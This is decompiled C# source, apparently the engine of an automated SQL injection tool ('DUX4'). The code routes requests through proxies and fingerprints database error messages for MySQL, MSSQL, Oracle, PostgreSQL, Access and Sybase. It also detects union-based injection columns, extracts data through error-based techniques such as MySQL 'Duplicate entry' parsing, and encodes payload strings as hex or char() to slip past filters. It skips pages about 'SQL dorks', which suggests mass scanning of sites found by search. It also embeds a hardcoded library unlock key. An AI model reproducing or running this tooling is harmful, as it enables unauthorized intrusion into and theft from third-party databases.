using System;
using System.Collections.Generic;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Web;
using Chilkat;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace DUX4;

[Serializable]
[Obfuscation(Exclude = true, ApplyToMembers = true)]
public class Main : MarshalByRefObject
{
	private enum Types
	{
		None,
		Unknown,
		MySQL_Unknown,
		MySQL_No_Error,
		MySQL_With_Error,
		MSSQL_Unknown,
		MSSQL_No_Error,
		MSSQL_With_Error,
		Oracle_Unknown,
		Oracle_No_Error,
		Oracle_With_Error,
		PostgreSQL_Unknown,
		PostgreSQL_No_Error,
		PostgreSQL_With_Error,
		MsAccess,
		Sybase
	}

	private enum eWebServer
	{
		UNKNOW,
		LINUX,
		WINDOWS
	}

	private Http __HTTP;

	private int __TimeOut { get; set; }

	private bool __FollowRedirects { get; set; }

	private string __UserAgent { get; set; }

	private string __Accept { get; set; }

	private int __Status { get; set; }

	private long __ContextSize { get; set; }

	private bool __WasRedirected { get; set; }

	private byte __PorxyType { get; set; }

	private string __PorxyUser { get; set; }

	private string __PorxyPass { get; set; }

	private string __PorxyHost { get; set; }

	private int __PorxyPort { get; set; }

	private int __TotalCall { get; set; }

	private long __TotalSize { get; set; }

	private bool __AcceptCookies { get; set; }

	private bool __Abort { get; set; }

	private string __LoginUser { get; set; }

	private string __LoginPassword { get; set; }

	private eWebServer __WebServer { get; set; }

	public Main()
	{
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0166: Expected O, but got Unknown
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Expected O, but got Unknown
		__FollowRedirects = true;
		__UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0";
		__Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
		__PorxyType = 0;
		__PorxyUser = string.Empty;
		__PorxyPass = string.Empty;
		__PorxyHost = string.Empty;
		__PorxyPort = 0;
		__Abort = false;
		__LoginUser = "";
		__LoginPassword = "";
		__HTTP = new Http();
		if (!__HTTP.IsUnlocked())
		{
			__HTTP.UnlockComponent("nI5uv4Http_5KMVwkSiNmAR");
		}
		__HTTP.ConnectTimeout = 10;
		__HTTP.ReadTimeout = 10;
		__HTTP.MaxResponseSize = 5242880u;
		__HTTP.FollowRedirects = true;
		__HTTP.AutoAddHostHeader = true;
		__HTTP.AllowGzip = true;
		__HTTP.SendCookies = true;
		__HTTP.SaveCookies = true;
		__HTTP.CookieDir = "memory";
		__HTTP.UseIEProxy = false;
		__HTTP.MaxConnections = 100;
		__HTTP.MaxResponseSize = 5242880u;
		__HTTP.EnableEvents = true;
		__HTTP.KeepEventLog = false;
		__HTTP.OnReceiveRate += new ReceiveRateEventHandler(OnReceiveRate);
		__HTTP.OnPercentDone += new PercentDoneEventHandler(OnPercentDone);
	}

	private void OnReceiveRate(object sender, DataRateEventArgs args)
	{
		__ContextSize = args.ByteCount;
	}

	private void OnPercentDone(object sender, PercentDoneEventArgs args)
	{
		args.Abort = __Abort;
	}

	public int TotalCall()
	{
		try
		{
			return __TotalCall;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			if (!(ex2 is ThreadAbortException))
			{
				Interaction.MsgBox(ex2.Message);
			}
			ProjectData.ClearProjectError();
		}
		return 0;
	}

	public long TotalSize()
	{
		return __TotalSize;
	}

	public int WebServer()
	{
		return (int)__WebServer;
	}

	public bool WasRedirected()
	{
		return __WasRedirected;
	}

	public int Status()
	{
		return __Status;
	}

	public long ContextSize()
	{
		return __ContextSize;
	}

	public void SetAcceptCookies(bool b)
	{
		__AcceptCookies = b;
	}

	public bool AddQuickHeader(string name, string value)
	{
		return __HTTP.AddQuickHeader(name, value);
	}

	public void Abort()
	{
		__Abort = true;
	}

	private void CheckSetup(Http o)
	{
		o.ProxyDomain = "";
		o.ProxyLogin = "";
		o.ProxyPassword = "";
		o.ProxyPort = 0;
		o.SocksHostname = "";
		o.SocksUsername = "";
		o.SocksPassword = "";
		o.SocksPort = 0;
		o.SocksVersion = 0;
		switch (__PorxyType)
		{
		case 4:
		case 5:
			o.SocksHostname = __PorxyHost;
			o.SocksUsername = __PorxyUser;
			o.SocksPassword = __PorxyPass;
			o.SocksPort = __PorxyPort;
			o.SocksVersion = __PorxyType;
			break;
		default:
			o.ProxyDomain = __PorxyHost;
			o.ProxyLogin = __PorxyUser;
			o.ProxyPassword = __PorxyPass;
			o.ProxyPort = __PorxyPort;
			break;
		case 0:
			break;
		}
		o.ConnectTimeout = __TimeOut;
		o.ReadTimeout = __TimeOut;
		o.FollowRedirects = __FollowRedirects;
		o.UserAgent = __UserAgent;
		o.Accept = __Accept;
		o.SendCookies = __AcceptCookies;
		o.SaveCookies = __AcceptCookies;
	}

	public void Dispose()
	{
		try
		{
			if (__HTTP != null)
			{
				__HTTP = null;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			if (!(ex2 is ThreadAbortException))
			{
				Interaction.MsgBox(ex2.Message);
			}
			ProjectData.ClearProjectError();
		}
	}

	public void Setup(int timeOut, bool followRedirect, string userAgent, string accept, string login, string password, byte pType, string pHost, int pPort, string pUser, string pPass)
	{
		__TimeOut = timeOut;
		__FollowRedirects = followRedirect;
		__UserAgent = userAgent;
		__Accept = accept;
		__LoginUser = login;
		__LoginPassword = password;
		__PorxyType = pType;
		__PorxyHost = pHost;
		__PorxyPort = pPort;
		__PorxyUser = pUser;
		__PorxyPass = pPass;
	}

	public string QuickPost(string url, Dictionary<string, string> post)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		checked
		{
			try
			{
				CheckSetup(__HTTP);
				string text = null;
				HttpResponse val = null;
				__HTTP.Referer = url;
				__TotalCall++;
				__ContextSize = 0L;
				__Status = 0;
				HttpRequest val2 = new HttpRequest();
				val2.UsePost();
				val2.SendCharset = true;
				foreach (KeyValuePair<string, string> item in post)
				{
					val2.AddParam(item.Key, HttpUtility.UrlEncode(item.Value));
				}
				try
				{
					val = __HTTP.PostUrlEncoded(url, val2);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
				if (val != null)
				{
					__Status = val.StatusCode;
					text = val.BodyStr;
					__WasRedirected = __HTTP.WasRedirected;
				}
				else
				{
					text = null;
				}
				if (text != null)
				{
					if (!string.IsNullOrEmpty(text))
					{
						if (__ContextSize > 0)
						{
							__TotalSize += __ContextSize;
						}
						text = HttpUtility.HtmlDecode(text).Trim();
					}
					__WebServer = CheckWebServer();
				}
				return text;
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				if (!(ex4 is ThreadAbortException))
				{
					Interaction.MsgBox(ex4.Message);
				}
				ProjectData.ClearProjectError();
			}
			return null;
		}
	}

	public string QuickGetIsolated(string url)
	{
		try
		{
			CheckSetup(__HTTP);
			return QuickGet(url, __HTTP);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			if (!(ex2 is ThreadAbortException))
			{
				Interaction.MsgBox(ex2.Message);
			}
			ProjectData.ClearProjectError();
		}
		return null;
	}

	public string QuickGet(string url, Http o)
	{
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		checked
		{
			try
			{
				string text = null;
				o.Referer = url;
				__TotalCall++;
				__ContextSize = 0L;
				__Status = 0;
				if (__HTTP != o)
				{
					__HTTP = o;
				}
				__HTTP.Login = __LoginUser;
				__HTTP.Password = __LoginPassword;
				try
				{
					StringBuilder val = new StringBuilder();
					try
					{
						__HTTP.QuickGetSb(url, val);
						text = val.ToString();
					}
					finally
					{
						((IDisposable)val)?.Dispose();
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
				__Status = __HTTP.LastStatus;
				__WasRedirected = __HTTP.WasRedirected;
				if (text != null)
				{
					if (!string.IsNullOrEmpty(text))
					{
						if (__ContextSize > 0)
						{
							__TotalSize += __ContextSize;
						}
						text = HttpUtility.HtmlDecode(text).Trim();
					}
					__WebServer = CheckWebServer();
				}
				return text;
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				if (!(ex4 is ThreadAbortException))
				{
					Interaction.MsgBox(ex4.Message);
				}
				ProjectData.ClearProjectError();
			}
			return null;
		}
	}

	public bool CheckKeyword(string url, string Keyword)
	{
		try
		{
			string text = QuickGetIsolated(url);
			if (!string.IsNullOrEmpty(text))
			{
				text = text.ToLower();
				Keyword = Keyword.ToLower();
				string value = HttpUtility.HtmlEncode(Keyword);
				return text.Contains(Keyword.ToLower()) || text.Contains(value);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			if (!(ex2 is ThreadAbortException))
			{
				Interaction.MsgBox(ex2.Message);
			}
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public int TryUnionBasead(string url, string key, int DBType)
	{
		string text = "";
		text = QuickGetIsolated(url);
		if (!string.IsNullOrEmpty(text))
		{
			if (text.Contains(key))
			{
				return CheckUnionColumn(text, key);
			}
			return -1;
		}
		return -2;
	}

	public int CheckSyntaxError(string url)
	{
		string text = QuickGetIsolated(url);
		if (string.IsNullOrEmpty(text))
		{
			return 0;
		}
		text = text.ToLower();
		bool flag = true;
		if (flag == text.IndexOf("Dork SQL Injection".ToLower()) >= 0 || flag == text.IndexOf("SQL Dork".ToLower()) >= 0 || flag == text.IndexOf("Dorks".ToLower()) >= 0 || flag == text.IndexOf("SQL Injection".ToLower()) >= 0)
		{
			return 0;
		}
		bool flag2 = true;
		if (flag2 == text.IndexOf("mysql_num_rows()".ToLower()) >= 0 || flag2 == text.IndexOf("mysql_fetch_array()".ToLower()) >= 0 || flag2 == text.IndexOf("mysql_result()".ToLower()) >= 0 || flag2 == text.IndexOf("mysql_query()".ToLower()) >= 0 || flag2 == text.IndexOf("mysql_fetch_assoc()".ToLower()) >= 0 || flag2 == text.IndexOf("mysql_numrows()".ToLower()) >= 0 || flag2 == text.IndexOf("mysql_fetch_row()".ToLower()) >= 0 || flag2 == text.IndexOf("mysql_fetch_object()".ToLower()) >= 0 || flag2 == text.IndexOf("JDBC MySQL()".ToLower()) >= 0 || flag2 == text.IndexOf("MySQL Driver".ToLower()) >= 0 || flag2 == text.IndexOf("MySQL Error".ToLower()) >= 0 || flag2 == text.IndexOf("MySQL ODBC".ToLower()) >= 0 || flag2 == text.IndexOf("on MySQL result index".ToLower()) >= 0 || flag2 == text.IndexOf("supplied argument is not a valid MySQL result resource".ToLower()) >= 0 || flag2 == text.IndexOf("MySQL server version for the right syntax to use near".ToLower()) >= 0 || flag2 == text.IndexOf("Driver][mysqld".ToLower()) >= 0 || flag2 == (text.IndexOf("Duplicate entry".ToLower()) >= 0 && text.IndexOf("for key 'PRIMARY'".ToLower()) >= 0))
		{
			return 2;
		}
		if (flag2 == text.IndexOf("Microsoft OLE DB Provider for ODBC Drivers error".ToLower()) >= 0 || flag2 == text.IndexOf("[Microsoft][ODBC SQL Server Driver][SQL Server]".ToLower()) >= 0 || flag2 == text.IndexOf("ODBC Drivers error '80040e14'".ToLower()) >= 0 || flag2 == text.IndexOf("ODBC SQL Server Driver".ToLower()) >= 0 || flag2 == text.IndexOf("JDBC SQL".ToLower()) >= 0 || flag2 == text.IndexOf("Microsoft OLE DB Provider for SQL Server".ToLower()) >= 0 || flag2 == text.IndexOf("Unclosed quotation mark".ToLower()) >= 0 || flag2 == text.IndexOf("VBScript Runtime".ToLower()) >= 0 || flag2 == text.IndexOf("SQLServer JDBC Driver".ToLower()) >= 0)
		{
			return 5;
		}
		if (flag2 == text.IndexOf("ORA-0".ToLower()) >= 0 || flag2 == text.IndexOf("ORA-1".ToLower()) >= 0 || flag2 == text.IndexOf("Oracle DB2".ToLower()) >= 0 || flag2 == text.IndexOf("Oracle Driver".ToLower()) >= 0 || flag2 == text.IndexOf("Oracle Error".ToLower()) >= 0 || flag2 == text.IndexOf("Oracle ODBC".ToLower()) >= 0 || flag2 == text.IndexOf("MM_XSLTransform error".ToLower()) >= 0 || flag2 == text.IndexOf("[Macromedia][Oracle JDBC Driver][Oracle]ORA-".ToLower()) >= 0 || flag2 == text.IndexOf("ociexecute(): OCIStmtExecute:".ToLower()) >= 0 || flag2 == text.IndexOf("ORA-1".ToLower()) >= 0)
		{
			return 8;
		}
		if (flag2 == ((text.IndexOf("[Microsoft][ODBC Microsoft Access Driver]".ToLower()) >= 0) & (text.IndexOf("WHERE".ToLower()) <= 0)) || flag2 == ((text.IndexOf("ODBC Microsoft Access Driver".ToLower()) >= 0) & (text.IndexOf("WHERE".ToLower()) <= 0)) || flag2 == text.IndexOf("ocifetch(): OCIFetch:".ToLower()) >= 0)
		{
			return 14;
		}
		if (flag2 == text.IndexOf("Warning: pg_exec() ".ToLower()) >= 0 || flag2 == text.IndexOf("function.pg-exec".ToLower()) >= 0 || flag2 == text.IndexOf("target_user:target_db:PostgreSQL".ToLower()) >= 0 || flag2 == text.IndexOf("PostgreSQL query failed".ToLower()) >= 0 || flag2 == text.IndexOf("Supplied argument is not a valid PostgreSQL result".ToLower()) >= 0 || flag2 == text.IndexOf("pg_fetch_array()".ToLower()) >= 0 || flag2 == text.IndexOf("pg_query()".ToLower()) >= 0 || flag2 == text.IndexOf("pg_fetch_assoc()".ToLower()) >= 0 || flag2 == text.IndexOf("function.pg-query".ToLower()) >= 0)
		{
			return 11;
		}
		if (flag2 == text.IndexOf("com.sybase.jdbc2.jdbc.SybSQLException".ToLower()) >= 0 || flag2 == text.IndexOf("SybSQLException".ToLower()) >= 0)
		{
			return 15;
		}
		if (flag2 == text.IndexOf("Error Executing Database Query".ToLower()) >= 0 || flag2 == text.IndexOf("ADODB.Command".ToLower()) >= 0 || flag2 == text.IndexOf("BOF or EOF".ToLower()) >= 0 || flag2 == text.IndexOf("ADODB.Field".ToLower()) >= 0 || flag2 == text.IndexOf("sql error".ToLower()) >= 0 || flag2 == text.IndexOf("syntax error".ToLower()) >= 0 || flag2 == text.IndexOf("OLE DB Provider for ODBC".ToLower()) >= 0 || flag2 == text.IndexOf("ADODBCommand".ToLower()) >= 0 || flag2 == text.IndexOf("ADODBField".ToLower()) >= 0 || flag2 == text.IndexOf("A syntax error has occurred".ToLower()) >= 0 || flag2 == text.IndexOf("Custom Error Message".ToLower()) >= 0 || flag2 == text.IndexOf("Incorrect syntax near".ToLower()) >= 0 || flag2 == text.IndexOf("Error Report".ToLower()) >= 0 || flag2 == text.IndexOf("Error converting data type varchar to numeric".ToLower()) >= 0 || flag2 == text.IndexOf("Incorrect syntax near".ToLower()) >= 0 || flag2 == text.IndexOf("SQL command not properly ended".ToLower()) >= 0 || flag2 == text.IndexOf("Types mismatch".ToLower()) >= 0 || flag2 == text.IndexOf("invalid query".ToLower()) >= 0 || flag2 == text.IndexOf("unexpected end of SQL command".ToLower()) >= 0 || flag2 == text.IndexOf("Unclosed quotation mark before the character string".ToLower()) >= 0 || flag2 == text.IndexOf("Unterminated string constant".ToLower()) >= 0 || flag2 == text.IndexOf("SQLException".ToLower()) >= 0 || flag2 == text.IndexOf("DBObject::doQuery".ToLower()) >= 0)
		{
			return 1;
		}
		return 0;
	}

	public string ParseHtmlData(string url, int dbType, string splitStr)
	{
		try
		{
			string text = "";
			string text2 = QuickGetIsolated(url);
			if (string.IsNullOrEmpty(text2))
			{
				return null;
			}
			if (dbType == 4 || dbType == 10)
			{
				int num = text2.ToLower().IndexOf("Duplicate entry".ToLower());
				checked
				{
					if (num >= 0)
					{
						text2 = text2.Substring(num);
						text = text2.Substring(text2.IndexOf("'") + 1);
						if (text.ToLower().StartsWith(splitStr.ToLower()))
						{
							text = text.Substring(splitStr.Length);
							text = text.Substring(0, text.IndexOf("'"));
						}
						else
						{
							text = Strings.Split(text, splitStr)[0];
						}
					}
					else
					{
						num = text2.ToLower().IndexOf(splitStr.ToLower());
						if (num > 0)
						{
							text = text2.Substring(num + splitStr.Length);
						}
					}
					if ((text.ToLower().IndexOf("for key".ToLower()) > 1) & (text.IndexOf("'") > 1))
					{
						text = text.Substring(0, text.ToLower().IndexOf("for key"));
						text = text.Substring(0, text.LastIndexOf("'"));
					}
					if (text.ToLower().IndexOf(splitStr.ToLower()) > 0)
					{
						text = ((!text.ToLower().StartsWith(splitStr.ToLower())) ? Strings.Split(text, splitStr)[0] : Strings.Split(text, splitStr)[1]);
					}
					if (text.EndsWith("'11"))
					{
						text = text.Substring(0, text.Length - 3);
					}
					else if (text.EndsWith("'1"))
					{
						text = text.Substring(0, text.Length - 2);
					}
				}
			}
			else
			{
				int num = text2.IndexOf(splitStr);
				if (num >= 0)
				{
					text = text2.Substring(checked(num + splitStr.Length));
					if (text.StartsWith(splitStr))
					{
						text = " ";
					}
					else
					{
						num = text.IndexOf(splitStr);
						if (num > 0)
						{
							text = text.Substring(0, num);
						}
						else
						{
							int[] obj = new int[3]
							{
								text.IndexOf('<'),
								text.IndexOf('>'),
								text.IndexOf('"')
							};
							num = text.Length;
							int[] array = obj;
							foreach (int num2 in array)
							{
								if (num > num2 && num2 > 0)
								{
									num = num2;
								}
							}
							text = text.Substring(0, num);
						}
					}
				}
			}
			if (string.IsNullOrEmpty(text))
			{
				return null;
			}
			text = text.Trim();
			if (TypeIsMSSQL(dbType) && text.Contains("' to a column of data type int."))
			{
				text = text.Replace("' to a column of data type int.", "");
			}
			return text;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			if (!(ex2 is ThreadAbortException))
			{
				Interaction.MsgBox(ex2.Message);
			}
			ProjectData.ClearProjectError();
		}
		return null;
	}

	private bool TypeIsMSSQL(Types t)
	{
		return t == Types.MSSQL_No_Error || t == Types.MSSQL_With_Error || t == Types.MSSQL_Unknown;
	}

	private eWebServer CheckWebServer()
	{
		if (__HTTP != null && !string.IsNullOrEmpty(__HTTP.LastResponseHeader))
		{
			if (__HTTP.LastResponseHeader.ToLower().Contains("iis") | __HTTP.LastResponseHeader.ToLower().Contains("microsoft"))
			{
				return eWebServer.WINDOWS;
			}
			return eWebServer.LINUX;
		}
		return __WebServer;
	}

	private int CheckUnionColumn(string hmtl, string sKeyword)
	{
		try
		{
			int num = hmtl.ToLower().IndexOf(sKeyword.ToLower());
			if (num > 0)
			{
				string text = hmtl.Substring(num);
				string text2 = text.Substring(sKeyword.Length, checked(text.IndexOf(".") - sKeyword.Length)).Trim();
				if (Versioned.IsNumeric(text2))
				{
					return Conversions.ToInteger(text2);
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		return 0;
	}

	private bool TypeIsMySQL(int t)
	{
		return t == 3 || t == 4 || t == 2;
	}

	private bool TypeIsMSSQL(int t)
	{
		return t == 6 || t == 7 || t == 5;
	}

	private bool TypeIsOracle(int t)
	{
		return t == 9 || t == 10 || t == 8;
	}

	private bool TypeIsPostgreSQL(int t)
	{
		return t == 12 || t == 13 || t == 11;
	}

	private string ConvertTextToHex(string sText)
	{
		checked
		{
			string result;
			try
			{
				if (string.IsNullOrEmpty(sText))
				{
					result = "";
				}
				else
				{
					char[] chars = sText.ToCharArray();
					byte[] bytes = Encoding.ASCII.GetBytes(chars);
					string text = "";
					int num = bytes.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						text += $"{bytes[i]:x2}";
					}
					result = "0x" + text;
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				result = sText;
				ProjectData.ClearProjectError();
			}
			return result;
		}
	}

	private string ConvertTextToSQLChar(string sText, bool bGroupChar, string sDelimiter = "+", string sChar = "char")
	{
		checked
		{
			string result;
			try
			{
				if (string.IsNullOrEmpty(sText))
				{
					result = "";
				}
				else
				{
					char[] chars = sText.ToCharArray();
					byte[] bytes = Encoding.ASCII.GetBytes(chars);
					string text = "";
					int num = bytes.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						text = ((!bGroupChar) ? ((i != 0) ? (text + sDelimiter + sChar + "(" + Convert.ToString(bytes[i]) + ")") : (text + sChar + "(" + Convert.ToString(bytes[i]) + ")")) : ((i != 0) ? (text + "," + Convert.ToString(bytes[i])) : (text + sChar + "(" + Convert.ToString(bytes[i]))));
					}
					if (bGroupChar)
					{
						text += ")";
					}
					result = text;
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				result = "ERROR: " + ex2.Message;
				ProjectData.ClearProjectError();
			}
			return result;
		}
	}
}
